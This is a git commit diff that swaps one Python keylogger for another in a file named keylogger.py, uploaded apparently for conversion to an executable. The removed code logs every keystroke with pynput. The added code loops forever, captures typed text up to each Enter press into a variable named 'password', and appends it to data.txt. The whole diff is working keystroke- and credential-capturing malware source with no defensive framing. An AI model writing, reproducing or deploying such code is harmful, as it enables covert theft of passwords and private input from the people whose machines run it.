a51fde29cfddce0cd663d3e4bdff512f4678f8f3
eroge-69 <erogexunamed@gmail.com>
2025-08-10 21:14:08 +0700

    Upload keylogger.py via PY to EXE tool

--- python-files/keylogger.py
+++ python-files/keylogger.py
@@ -1,36 +1,15 @@
-from pynput import keyboard
+# Importing the keyboard module which will acess the inputs from the keyboard
+import keyboard
 
-LOG_FILE = "keylog.txt"
+# Defining the text file name and path
+path = "data.txt"
 
-# Function to write keystrokes to file
-def on_press(key):
-    try:
-        with open(LOG_FILE, "a") as f:
-            f.write(str(key.char))
-    except AttributeError:
-        special_keys = {
-            'space': ' ',
-            'enter': '\n',
-            'tab': '\t',
-        }
-        ignored_keys = {'ctrl', 'ctrl_l', 'ctrl_r', 'shift', 'shift_l', 'shift_r', 'alt', 'alt_l', 'alt_r', 'caps_lock', 'esc', 'cmd', 'cmd_l', 'cmd_r', 'menu'}
-        key_name = key.name if hasattr(key, 'name') else str(key)
-        if key_name == 'backspace':
-            try:
-                with open(LOG_FILE, "rb+") as f:
-                    f.seek(0, 2)
-                    size = f.tell()
-                    if size > 0:
-                        f.truncate(size - 1)
-            except Exception:
-                pass
-        elif key_name in special_keys:
-            with open(LOG_FILE, "a") as f:
-                f.write(special_keys[key_name])
-        elif key_name not in ignored_keys:
-            with open(LOG_FILE, "a") as f:
-                f.write(f'<{key_name}>')
-
-# Start listening to keyboard events
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+while True:
+    with open(path, 'a') as data_file:
+        
+        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
+        events = keyboard.record('enter')
+        password = list(keyboard.get_typed_strings(events))
+        
+        data_file.write('\n') # New line written before data is written
+        data_file.write(password[0])
